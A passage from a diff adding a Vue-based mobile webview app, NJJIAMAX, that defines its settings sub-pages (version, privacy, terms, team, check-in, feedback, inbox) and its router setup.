+                                <span style="color: var(--text-muted);">&gt;</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                function contactUs() {
+                    window.location.href = 'mailto:dvwegw.vbwre.fwew@gmail.com';
+                }
+                return { contactUs };
+            }
+        };
+
+        // Sub-pages under Settings
+        const VersionComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Version</div><div style="width:40px;"></div></div>
+                    <div class="card" style="text-align: center; padding: 30px 16px;">
+                        <h2 style="margin-bottom: 8px;">NJJIAMAX v2.4.0</h2>
+                        <p style="color: var(--text-muted); font-size: 13px;">Stable production build for mobile webview.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        const PrivacyComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Privacy Policy</div><div style="width:40px;"></div></div>
+                    <div class="card">
+                        <h3 style="margin-bottom: 8px;">Data Protection</h3>
+                        <p style="margin-bottom: 10px;">We respect your privacy. All financial calculations and local notes are stored securely on your device.</p>
+                        <p>No unauthorized data collection is performed outside standard operational parameters.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        const TermsComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Terms of Service</div><div style="width:40px;"></div></div>
+                    <div class="card">
+                        <h3 style="margin-bottom: 8px;">Service Usage</h3>
+                        <p style="margin-bottom: 10px;">By using NJJIAMAX, you agree to utilize the provided tools responsibly for personal financial analysis.</p>
+                        <p>All market data is for reference purposes only.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        const TeamComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">About Team</div><div style="width:40px;"></div></div>
+                    <div class="card">
+                        <h3 style="margin-bottom: 8px;">NJJIAMAX Engineering</h3>
+                        <p>We are a dedicated group of mobile frontend specialists building high-performance lightweight web solutions.</p>
+                    </div>
+                </div>
+            `
+        };
+
+        const CheckinComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Monthly Check-in</div><div style="width:40px;"></div></div>
+                    <div class="card" style="text-align: center;">
+                        <h3 style="margin-bottom: 12px;">Daily Check-in</h3>
+                        <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 16px;">Check in daily to maintain your streak.</p>
+                        <button class="btn" @click="checkIn" :disabled="checked">{{ checked ? 'Checked In Today' : 'Check In Now' }}</button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const checked = ref(localStorage.getItem('nj_checked') === 'true');
+                function checkIn() {
+                    localStorage.setItem('nj_checked', 'true');
+                    checked.value = true;
+                    showToast('Check-in successful!');
+                }
+                return { checked, checkIn };
+            }
+        };
+
+        const FeedbackComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Feedback</div><div style="width:40px;"></div></div>
+                    <div class="card">
+                        <div class="input-group">
+                            <label>Title</label>
+                            <input type="text" v-model="title" placeholder="Enter title..." />
+                        </div>
+                        <div class="input-group">
+                            <label>Content</label>
+                            <textarea rows="4" v-model="content" placeholder="Enter feedback..."></textarea>
+                        </div>
+                        <button class="btn" :style="{ opacity: isValid ? 1 : 0.5 }" :disabled="!isValid" @click="sendFeedback">Submit Feedback</button>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const router = useRouter();
+                const title = ref('');
+                const content = ref('');
+                const isValid = computed(() => title.value.trim() && content.value.trim());
+
+                function sendFeedback() {
+                    if (!isValid.value) return;
+                    showToast('Feedback sent successfully!');
+                    title.value = '';
+                    content.value = '';
+                    setTimeout(() => router.back(), 500);
+                }
+                return { title, content, isValid, sendFeedback };
+            }
+        };
+
+        const InboxComp = {
+            template: `
+                <div class="view-container no-tab">
+                    <div class="header-bar"><button class="back-btn" @click="$router.back()">Back</button><div class="header-title">Inbox</div><div style="width:40px;"></div></div>
+                    <div style="padding: 16px;">
+                        <div class="card" @click="showAlert = true" style="cursor: pointer;">
+                            <div style="font-weight: 600; margin-bottom: 4px;">Welcome</div>
+                            <div style="font-size: 12px; color: var(--text-muted);">Tap to read message content.</div>
+                        </div>
+                    </div>
+                    <div v-if="showAlert" style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); display:flex; align-items:center; justify-content:center; z-index:2000;">
+                        <div class="card" style="width: 80%; background: var(--card-bg);">
+                            <h3 style="margin-bottom: 8px;">Welcome to NJJIAMAX</h3>
+                            <p style="font-size: 13px; margin-bottom: 16px; color: var(--text-muted);">Thank you for using our mobile webview app. Enjoy seamless local tools and real-time market overviews.</p>
+                            <button class="btn" @click="showAlert = false">Close</button>
+                        </div>
+                    </div>
+                </div>
+            `,
+            setup() {
+                const showAlert = ref(false);
+                return { showAlert };
+            }
+        };
+
+        // Router Setup
+        const routes = [
+            { path: '/', component: LoadingComp },
+            { path: '/home', component: HomeComp },
+            { path: '/toolbox', component: ToolboxComp },
+            { path: '/settings', component: SettingsComp },
+            { path: '/detail', component: StockDetailComp },
+            { path: '/list/:type', component: StockSubListComp },
+            { path: '/article', component: ArticleComp },
+            { path: '/version', component: VersionComp },
+            { path: '/privacy', component: PrivacyComp },
+            { path: '/terms', component: TermsComp },
+            { path: '/team', component: TeamComp },
+            { path: '/checkin', component: CheckinComp },
+            { path: '/feedback', component: FeedbackComp },
+            { path: '/inbox', component: InboxComp }
+        ];
+
+        const router = createRouter({
+            history: createWebHashHistory(),
+            routes
+        });
+
+        // App Root Instance
+        const app = createApp({
+            setup() {
+                const route = useRoute();
+                const showTabBar = computed(() => {
+                    return ['/home', '/toolbox', '/settings'].includes(route.path);
+                });
+                return { showTabBar };
+            }
+        });
+
+        app.use(router);
+        app.mount('#app');
+    </script>
+</body>
+</html>
